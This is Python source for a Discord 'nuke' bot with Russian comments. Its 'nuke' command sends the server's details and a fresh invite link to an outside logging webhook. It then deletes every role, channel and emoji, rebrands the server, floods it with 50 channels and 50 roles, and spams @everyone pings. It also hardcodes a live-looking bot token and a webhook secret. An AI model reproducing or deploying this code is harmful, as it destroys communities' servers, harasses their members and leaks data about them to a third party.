#https://t.me/rezet_selfbot - тг создателя
from discord.ext import commands
import discord
import aiohttp
import os
import time
import asyncio
import random
import threading
import aiohttp
from threading import Thread
from discord import Permissions
from discord.utils import get
from time import sleep

loghook = 'https://discord.com/api/webhooks/1005204352769724456/iH4tHJgwwdn1wWHWXcv9WsCsuwEl0JnDlMc8z-ZHx-jmiLqUifcMNBs5RkMxuvNemNsm'
wl = [968268832592527440, 993883030781448333, 1000327295237623849 , 995246871104729139, 1003672968347525244, 957412381460430879, 1005192694722736240]

TOKEN = 'MTAxMzQ0MjQwMDk1NTQwNDMxOA.GMFAef.YHJ_XSsKT6YxdXnEeAzQMowanJxIpFpeO0VsY8'
intents = discord.Intents.all()
client = commands.Bot(command_prefix = 'th.', intents=intents)
client.remove_command('help')
@client.event
async def on_ready():
    activity = discord.Streaming(name='TenHub', url = 'https://twitch.tv/unknownpage')
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("Bot Running////////\n\n\n Author: RezetName")

@client.event
async def on_guild_join(guild):
    if guild.id in wl:
        await guild.text_channels[0].send("ГГ тима раков я ливаю")
        await guild.leave()

@client.command()
async def nuke(ctx):
    guild = ctx.guild 

    members = len(guild.members)
    invitelink = await ctx.channel.create_invite(max_uses=1, unique=True)

    async with aiohttp.ClientSession() as session:  # с помощью aiohttp отправляем лог на вебхук
        webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
        await webhook.send(embed = discord.Embed(
            title=f'Крашится сервер {guild.name}',
            description=f'**ID сервера:** `{guild.id}`\n**Овнер:** `{guild.owner}`\n**Участников:** `{len(guild.members)}`\n**Количество каналов:** `{len(guild.channels)}`\n**Количество ролей:** `{len(guild.roles)}`\n, **ссылка на крашнутый серв - {invitelink}**', 
            colour=discord.Colour.from_rgb(214, 5, 9)))

    for a in ctx.guild.roles:
        try: await a.delete()
        except: pass
    for b in ctx.guild.channels:
        try: await b.delete()
        except: pass
    for c in ctx.guild.emojis:
        try: await c.delete()
        except: pass
    with open('tenhub.jpg', 'rb') as f:
        icon = f.read()
        try: await ctx.guild.edit(name="Crash by Tenhub", icon=icon)
        except: pass
    for x in range(50):
        try: await ctx.guild.create_text_channel(name="crash-by-tenhub")
        except: pass
    for y in range(50):
        try: await ctx.guild.create_role(name="Crash by TenHub")
        except: 
            pass


@client.event
async def on_guild_channel_create(channel):
    if channel.name == 'crash-by-tenhub':
        webhook = await  channel.create_webhook(name = "TenCrash")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        for _ in range(10):
            try:
                await webhook.send('@everyone @here Rezet')
            except:
                pass

client.run(TOKEN)